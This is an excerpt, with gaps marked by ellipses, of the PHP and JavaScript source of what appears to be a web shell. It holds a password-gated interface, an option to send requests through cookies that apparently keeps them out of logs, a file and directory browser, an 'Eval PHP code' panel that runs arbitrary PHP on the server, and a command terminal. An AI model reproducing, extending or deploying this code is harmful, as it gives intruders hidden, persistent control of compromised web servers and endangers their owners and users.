...
$GLOBALS['ACECONF'] = array('DEFAULT' => true, 'THEME' => 'crimson_editor', 'MODE' => 'php', 'URL' => 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.37.0/ace.js');
...
function paramsHandlerJS(){
	return '<script>
		...
		invertColors('.($GLOBALS['DARK'] ? '':'"#divTrm"').');
		cookieVarSetup();
		startEventsListners();
		...
		function cookieVarSetup(){
			COOKIE = sessionStorage.getItem("cbCO") !== null ? parseInt(sessionStorage.getItem("cbCO")) : '.(int)$GLOBALS['COOKIE'].';
		...
		function checkRequestCaching(){
			var pe = document.getElementsByName("pass");

			if(pe[0] && document.cookie.indexOf(setName("pass")) !== -1){
				var cbCO = document.createElement("input");
				cbCO.id = "cbCO";
				cbCO.type = "checkbox";
				cbCO.title = "Use cookie to request";
				cbCO.setAttribute("onclick", "v = (this.checked ? 1 : 0); COOKIE = v; sessionStorage.setItem(\'cbCO\', v);");
				getParentFormOf(pe[0]).appendChild(cbCO);
			}
		}
		...
		function submitViaCookie(encodedForm, refresh = true){
			...
			for(i = 0; i < elements.length; i++) {
				...
				if((value.length + value.length) > 4095 || reqlen > 7696){
		...
		function invertColors(name = "html") {
			const head = document.head;
			let style = document.getElementById("invertColors");

			if (!style) {
				style = document.createElement("style");
				style.id = "invertColors";
				head.appendChild(style);
			}

			const isInverted = style.dataset.inverted === "true";
			style.dataset.inverted = !isInverted;

			style.textContent = `${name} { filter: invert(${isInverted ? 0 : 90}%); }`;
...
function uiShwModal(elm) {
 ...
 elm.style.top = `calc(50% - ${rect.height / 2}px)`;
 elm.style.left = `calc(50% - ${rect.width / 2}px)`;
 mdlWndws.push(elm);
 elm.focus();
 return false;
}
...
function onGoTo(div, data, chrst) {
 if (typeof data === 'string') {
  ...
  if (data.f.length === 0 && (data.m === 0 || data.m === 2)) uiChngMsg(div, "Can't read dir " + data.p, 'Err');
   ...
   if(GD){
    elmById('spnPth').title = data.p;
    elmById('spnPth').textContent = reduce(data.p);
   }
...
function evl() {
 ...
 var cur = elmById('txtPHP').value;

 elmById('txtPHP').value = elmById('txtPHP').value.replace(/^\s*<\?(php|=)?\s*/i, '');
 if(GD) elmById('txtPHP').value = elmById('txtPHP').value.replace(/^/, 'if(function_exists(\'chdir\')) chdir(\'' + elmById('spnPth').title.replace(/['\\]/g, '\\$&') + '\');\n');
 
 if (frm.e.value === '')
	elmById('prePHP').innerHTML = '';
 else ajxSnd('Eval PHP code', onEvl, frm, {
  a: 'p'
 }, elmById('slctPHPCS').value);
 
 elmById('txtPHP').value = cur;
...
function prntMsg(msg, prompt = true) {
 prompt = prompt ? reduce(elmById('spnUsrHst').title) + ':' + reduce(elmById('spnPth').title) + '$ ' : '';
 
 if(elmById('cbIT').checked){
	elmById('divTrm').append(elmById('preTrm'));
    elmById('preTrm').textContent = prompt + msg + '\n' + elmById('preTrm').textContent;
}
 else{
...
function exec() {
 ...
 if (cmd === '?') {
  ...
  else if (cmd === 'color') invertColors('#divTrm');
 else {
